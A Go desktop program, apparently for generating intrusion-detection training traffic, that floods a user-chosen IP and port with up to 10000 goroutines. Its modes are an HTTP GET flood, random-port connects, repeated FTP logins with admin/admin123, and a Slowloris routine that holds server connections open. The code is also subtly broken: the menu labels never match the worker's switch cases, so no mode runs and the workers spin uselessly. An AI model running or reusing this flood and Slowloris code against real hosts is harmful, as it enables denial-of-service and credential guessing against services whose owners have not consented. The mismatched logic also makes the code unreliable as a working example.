package main

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"sync/atomic"
	"syscall"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
)

// 攻击统计
var (
	reqCount uint64
	isRunning bool
)

func main() {
	// 初始化 Fyne 应用
	a := app.New()
	w := a.NewWindow("IDS High-Performance Simulator")
	w.Resize(fyne.NewSize(600, 500))

	// UI 组件定义
	ipEntry := widget.NewEntry()
	ipEntry.SetText("127.0.0.1")
	portEntry := widget.NewEntry()
	portEntry.SetText("80")
	threadsEntry := widget.NewEntry()
	threadsEntry.SetText("1000") // 默认 1000 个轻量级协程

	attackSelect := widget.NewSelect([]string{
		"1. DoS Hulk (High-Freq HTTP GET)",
		"2. PortScan (TCP SYN Flood)",
		"3. FTP-Patator (Slow Brute Force)",
		"4. Slowloris (Keep-Alive Deadlock)",
	}, nil)
	attackSelect.SetSelectedIndex(0)

	logArea := widget.NewMultiLineEntry()
	logArea.Disable() // 只读

	var cancelFunc context.CancelFunc

	logMsg := func(msg string) {
		timestamp := time.Now().Format("15:04:05")
		currentText := logArea.Text
		if len(currentText) > 5000 {
			currentText = currentText[len(currentText)-3000:] // 防止日志太长卡顿
		}
		logArea.SetText(fmt.Sprintf("[%s] %s\n%s", timestamp, msg, currentText))
	}

	// 状态监控协程
	go func() {
		for {
			if isRunning {
				count := atomic.LoadUint64(&reqCount)
				if count > 0 {
					logMsg(fmt.Sprintf("[*] Live Packets/Connections: %d", count))
				}
			}
			time.Sleep(2 * time.Second)
		}
	}()

	startBtn := widget.NewButton("Start Attack", nil)
	stopBtn := widget.NewButton("Stop Attack", nil)
	stopBtn.Disable()

	startBtn.OnTapped = func() {
		ip := ipEntry.Text
		port := portEntry.Text
		threadsStr := threadsEntry.Text
		attackType := attackSelect.Selected

		if ip == "" || port == "" {
			dialog.ShowError(fmt.Errorf("IP and Port cannot be empty"), w)
			return
		}

		threads, err := strconv.Atoi(threadsStr)
		if err != nil || threads <= 0 {
			dialog.ShowError(fmt.Errorf("Threads must be a positive integer"), w)
			return
		}

		// 限制 16GB 轻薄本的最大协程数，防止操作系统 TCP 句柄耗尽崩溃
		if threads > 10000 {
			dialog.ShowInformation("Warning", "Threads limited to 10000 to protect OS", w)
			threads = 10000
			threadsEntry.SetText("10000")
		}

		ctx, cancel := context.WithCancel(context.Background())
		cancelFunc = cancel
		isRunning = true
		atomic.StoreUint64(&reqCount, 0)

		startBtn.Disable()
		stopBtn.Enable()

		logMsg(fmt.Sprintf(">>> Starting %s", attackType))
		logMsg(fmt.Sprintf(">>> Target: %s:%s, Threads: %d", ip, port, threads))

		// 启动攻击工作协程
		for i := 0; i < threads; i++ {
			go worker(ctx, ip, port, attackType)
		}
	}

	stopBtn.OnTapped = func() {
		if cancelFunc != nil {
			cancelFunc()
		}
		isRunning = false
		startBtn.Enable()
		stopBtn.Disable()
		logMsg("<<< Attack Stopped")
	}

	// 布局拼装
	form := container.NewVBox(
		widget.NewLabelWithStyle("Target Configuration", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		container.NewGridWithColumns(4,
			widget.NewLabel("IP Address:"), ipEntry,
			widget.NewLabel("Port:"), portEntry,
		),
		container.NewGridWithColumns(2,
			widget.NewLabel("Threads (Max 10000):"), threadsEntry,
		),
		widget.NewLabelWithStyle("Attack Mode", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		attackSelect,
		container.NewGridWithColumns(2, startBtn, stopBtn),
		widget.NewLabelWithStyle("Live Logs", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
	)

	content := container.NewBorder(form, nil, nil, nil, logArea)
	w.SetContent(content)

	// 优雅退出
	go func() {
		sigs := make(chan os.Signal, 1)
		signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
		<-sigs
		if cancelFunc != nil {
			cancelFunc()
		}
		os.Exit(0)
	}()

	w.ShowAndRun()
}

// 攻击执行器
func worker(ctx context.Context, ip string, port string, attackType string) {
	target := fmt.Sprintf("%s:%s", ip, port)

	for {
		select {
		case <-ctx.Done():
			return
		default:
			switch attackType {
			case "1. DoS Hulk (高频残缺短连接)":
				doHulk(target)
			case "2. PortScan (并发 TCP SYN)":
				doPortScan(ip)
			case "3. FTP-Patator (模拟慢速爆破特征)":
				doFTPBrute(target)
			case "4. Slowloris (死锁长连接)":
				doSlowloris(ctx, target)
				return // Slowloris 只需要建立一次连接并挂起，所以跳出外层循环
			}
		}
	}
}

// 模式1：真实高频短连接特征
func doHulk(target string) {
	// 设置极短超时，无论连不连得上，马上抛弃，制造大量微型流
	conn, err := net.DialTimeout("tcp", target, 50*time.Millisecond)
	if err == nil {
		// 发送残缺的 HTTP GET 头，不等待响应立刻关闭，这就是 Hulk 的精髓
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
		conn.Close()
		atomic.AddUint64(&reqCount, 1)
	}
	// 微小睡眠防止 CPU 100% 卡死轻薄本
	time.Sleep(1 * time.Millisecond)
}

// 模式2：随机端口 TCP 连接
func doPortScan(ip string) {
	randomPort := rand.Intn(65535) + 1
	target := fmt.Sprintf("%s:%d", ip, randomPort)
	conn, err := net.DialTimeout("tcp", target, 20*time.Millisecond)
	if err == nil {
		conn.Close()
		atomic.AddUint64(&reqCount, 1)
	}
	time.Sleep(2 * time.Millisecond)
}

// 模式3：慢速交互 (对齐 Python 爆破特征)
func doFTPBrute(target string) {
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err == nil {
		conn.Write([]byte("USER admin\r\nPASS admin123\r\n"))
		// 刻意等待一段时间，拉长 Flow IAT 特征，这会让多分类模型将其识别为 Patator
		time.Sleep(200 * time.Millisecond)
		conn.Close()
		atomic.AddUint64(&reqCount, 1)
	}
	time.Sleep(50 * time.Millisecond)
}

// 模式4：建立死锁长连接
func doSlowloris(ctx context.Context, target string) {
	conn, err := net.DialTimeout("tcp", target, 2*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n"))
	atomic.AddUint64(&reqCount, 1)

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// 每 10 秒发送一个垃圾请求头，永远不发最后的 \r\n\r\n，挂死服务器连接
			_, err := conn.Write([]byte("X-a: b\r\n"))
			if err != nil {
				return
			}
		}
	}
}
